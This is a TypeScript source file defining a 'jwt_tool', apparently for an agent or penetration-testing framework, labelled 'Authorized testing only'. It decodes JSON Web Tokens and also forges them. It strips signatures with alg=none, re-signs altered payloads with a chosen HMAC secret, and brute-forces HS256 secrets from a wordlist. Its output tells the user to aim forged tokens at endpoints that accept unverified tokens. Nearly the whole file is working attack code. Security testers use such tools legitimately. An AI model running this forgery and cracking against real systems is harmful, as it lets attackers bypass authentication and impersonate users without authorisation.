import { Tool } from "./tool"
import z from "zod"
import crypto from "crypto"

const DESCRIPTION =
  "JWT analysis & exploitation: decode, re-sign with custom secret, forge with alg=none, brute-force HMAC secret against a wordlist. Authorized testing only."

const PARAMETERS = z.object({
  action: z.enum(["decode", "tamper_none", "tamper_hs256", "brute_hs256"]).describe("Operation to perform"),
  token: z.string().describe("JWT token (header.payload.signature)"),
  payload: z.string().optional().describe("JSON payload override (for tamper actions)"),
  secret: z.string().optional().describe("HMAC secret (for tamper_hs256)"),
  wordlist: z.array(z.string()).optional().describe("Candidate secrets for brute_hs256"),
})

function b64url(buf: Buffer | string) {
  const b = typeof buf === "string" ? Buffer.from(buf, "utf-8") : buf
  return b.toString("base64").replace(/=+$/, "").replace(/\+/g, "-").replace(/\//g, "_")
}

function b64urlDecode(s: string) {
  s = s.replace(/-/g, "+").replace(/_/g, "/")
  while (s.length % 4) s += "="
  return Buffer.from(s, "base64")
}

function sign(header: string, payload: string, secret: string) {
  return b64url(crypto.createHmac("sha256", secret).update(`${header}.${payload}`).digest())
}

export const JWTTool = Tool.define("jwt_tool", {
  description: DESCRIPTION,
  parameters: PARAMETERS,
  async execute(params) {
    const parts = params.token.split(".")
    if (parts.length < 2) throw new Error("Invalid JWT: expected header.payload[.signature]")
    const [h, p, s] = parts
    const header = JSON.parse(b64urlDecode(h).toString("utf-8"))
    const payload = JSON.parse(b64urlDecode(p).toString("utf-8"))

    if (params.action === "decode") {
      const out = `## JWT Decode

**Header**:
\`\`\`json
${JSON.stringify(header, null, 2)}
\`\`\`

**Payload**:
\`\`\`json
${JSON.stringify(payload, null, 2)}
\`\`\`

**Signature**: \`${s ?? "(none)"}\`
**Algorithm**: ${header.alg}
${header.alg === "none" ? "\n[!] alg=none — no signature verification." : ""}
${header.alg?.startsWith("HS") ? "\n[!] HMAC algorithm — vulnerable to weak-secret brute force." : ""}`
      return {
        title: "JWT Decode",
        output: out,
        metadata: { action: "decode", alg: header.alg, claims: payload } as Record<string, any>,
      }
    }

    if (params.action === "tamper_none") {
      const newPayload = params.payload ? JSON.parse(params.payload) : payload
      const newHeader = { ...header, alg: "none" }
      const forged = `${b64url(JSON.stringify(newHeader))}.${b64url(JSON.stringify(newPayload))}.`
      return {
        title: "JWT Forge (alg=none)",
        output: `## JWT Forged with alg=none\n\n\`\`\`\n${forged}\n\`\`\`\n\nUse against endpoints that accept unverified tokens.`,
        metadata: { action: "tamper_none", token: forged } as Record<string, any>,
      }
    }

    if (params.action === "tamper_hs256") {
      if (!params.secret) throw new Error("secret required for tamper_hs256")
      const newPayload = params.payload ? JSON.parse(params.payload) : payload
      const newHeader = { ...header, alg: "HS256" }
      const hh = b64url(JSON.stringify(newHeader))
      const pp = b64url(JSON.stringify(newPayload))
      const ss = sign(hh, pp, params.secret)
      const forged = `${hh}.${pp}.${ss}`
      return {
        title: "JWT Forge (HS256)",
        output: `## JWT Re-signed with HS256\n\nSecret: \`${params.secret}\`\n\n\`\`\`\n${forged}\n\`\`\``,
        metadata: { action: "tamper_hs256", token: forged } as Record<string, any>,
      }
    }

    if (params.action === "brute_hs256") {
      if (!params.wordlist?.length) throw new Error("wordlist required for brute_hs256")
      if (!s) throw new Error("token has no signature")
      let found: string | null = null
      let tried = 0
      for (const candidate of params.wordlist) {
        tried++
        if (sign(h, p, candidate) === s) {
          found = candidate
          break
        }
      }
      const out = `## HMAC Brute Force\n\n**Tried**: ${tried} / ${params.wordlist.length}\n**Result**: ${found ? `\`${found}\` ✓` : "no match"}`
      return {
        title: "JWT Brute",
        output: out,
        metadata: { action: "brute_hs256", found, tried } as Record<string, any>,
      }
    }

    throw new Error("unknown action")
  },
})
